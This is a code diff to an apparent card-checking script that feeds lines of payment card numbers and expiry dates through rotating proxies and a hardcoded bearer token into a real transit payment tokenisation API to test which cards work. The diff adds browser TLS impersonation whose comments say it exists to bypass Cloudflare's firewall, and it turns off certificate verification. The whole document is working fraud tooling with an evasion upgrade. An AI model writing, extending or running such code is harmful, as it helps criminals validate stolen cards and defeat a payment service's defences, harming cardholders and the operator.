@@ -18,6 +18,8 @@ except ImportError:
     jwe = None
     base64url_encode = None
 
+# curl_cffi for TLS fingerprint impersonation to bypass Cloudflare WAF
+from curl_cffi import requests as cffi_requests
 import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -236,7 +238,6 @@ def verify_key():
 # --- Web Checker Logic ---
 
 TOKENISATION_BASE = "https://web.uk.littlepay.com"
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 INLINE_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"
 
 class WebProxyPool:
@@ -278,9 +279,10 @@ def check_single_card(card_line, proxy_pool, custom_cookies=""):
     expiry = f"{mo}/{yr[-2:]}"
     card_type = "visa" if cc.startswith("4") else "mastercard"
 
-    session = requests.Session()
-    session.trust_env = False
+    # Use curl_cffi with browser TLS impersonation to bypass Cloudflare
+    session = cffi_requests.Session(impersonate="chrome")
     p_dict = proxy_pool.next() if proxy_pool else None
+    proxy_str = p_dict["http"] if p_dict else None
 
     if custom_cookies:
         for c in custom_cookies.split(";"):
@@ -290,7 +292,6 @@ def check_single_card(card_line, proxy_pool, custom_cookies=""):
 
     headers = {
         "Authorization": f"Bearer {INLINE_BEARER_TOKEN}",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9",
         "Origin": "https://coastrta.littlepay.com",
@@ -298,19 +299,12 @@ def check_single_card(card_line, proxy_pool, custom_cookies=""):
         "Sec-Fetch-Dest": "empty",
         "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "cross-site",
-        "Connection": "keep-alive"
     }
 
     try:
-        if not custom_cookies:
-            try:
-                session.get("https://coastrta.littlepay.com/en/coast-rta/trip-history", headers={**headers, "Accept": "text/html"}, proxies=p_dict, timeout=8, verify=False)
-            except Exception:
-                pass
-
         r = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
                         headers=headers, 
-                        proxies=p_dict, timeout=10, verify=False)
+                        proxy=proxy_str, timeout=10, verify=False)
         if r.status_code != 200:
             return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
         
@@ -343,7 +337,7 @@ def check_single_card(card_line, proxy_pool, custom_cookies=""):
         r2 = session.post(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
                           headers=auth_headers,
                           json={"key_id": key_entry["id"], "encrypted_payment_data": jwe_token, "payment_token_type": "CARD_DATA", "save_card": False},
-                          proxies=p_dict, timeout=10, verify=False)
+                          proxy=proxy_str, timeout=10, verify=False)
         
         try:
             res_data = r2.json()
@@ -360,7 +354,7 @@ def check_single_card(card_line, proxy_pool, custom_cookies=""):
 
         r3 = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
                        headers=headers,
-                       proxies=p_dict, timeout=10, verify=False)
+                       proxy=proxy_str, timeout=10, verify=False)
         
         try:
             tok_data = r3.json()
